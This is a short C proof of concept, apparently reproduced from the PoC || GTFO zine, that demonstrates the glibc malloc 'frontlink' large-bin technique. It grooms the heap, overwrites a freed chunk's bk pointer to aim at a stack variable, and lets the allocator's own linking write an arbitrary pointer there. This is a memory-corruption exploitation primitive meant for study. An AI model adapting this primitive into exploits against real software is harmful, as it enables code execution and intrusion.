/* Copied from PoC || GTFO 0x18 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <stddef.h>

#ifndef INTERNAL_SIZE_T
#define INTERNAL_SIZE_T size_t
#endif

#define SIZE_SZ (sizeof(INTERNAL_SIZE_T))

struct malloc_chunck {
	INTERNAL_SIZE_T prev_size;
	INTERNAL_SIZE_T size;

	struct malloc_chunck *fd;
	struct malloc_chunck *bk;

	struct malloc_chunck *fd_nextsize;
	struct malloc_chunck *bk_nextsize;
};

typedef struct malloc_chunck* mchunckptr;

#define MIN_CHUNCK_SIZE (offsetof(struct malloc_chunck, fd_nextsize))
#define mem2chunck(mem) ((mchunckptr)((char*)mem-2*SIZE_SZ))

#define ALLOCATION_BIG (0x800 - sizeof(size_t))

int main(int argc, char **argv) {
	char *YES = "YES";
	char *NO = "NO";
	int i;

	for (i=0; i<64; i++) {
		void *tmp = malloc(MIN_CHUNCK_SIZE + sizeof(size_t) * (1+2*i));
		malloc(ALLOCATION_BIG);
		free(tmp);
		malloc(ALLOCATION_BIG);
	}

	char *verdict = NO;
	printf("Should frontlink work? %s\r\n", verdict);

	char *p0 = malloc(ALLOCATION_BIG);
	assert(strlen(YES) < sizeof(size_t)); /* This is not an overflow */
	memcpy(p0 + ALLOCATION_BIG - sizeof(size_t), YES, 1 + strlen(YES));

	void **p1 = malloc(0x720 - 8);
	malloc(ALLOCATION_BIG);
	void **p2 = malloc(0x710 - 8);
	malloc(ALLOCATION_BIG);

	free(p2);
	malloc(ALLOCATION_BIG);

	mem2chunck(p2)->bk = ((void*)&verdict) - offsetof(struct malloc_chunck, fd);

	free(p1);
	malloc(ALLOCATION_BIG);

	printf("Does frontlink work? %s\r\n", verdict);
	return 0;
}
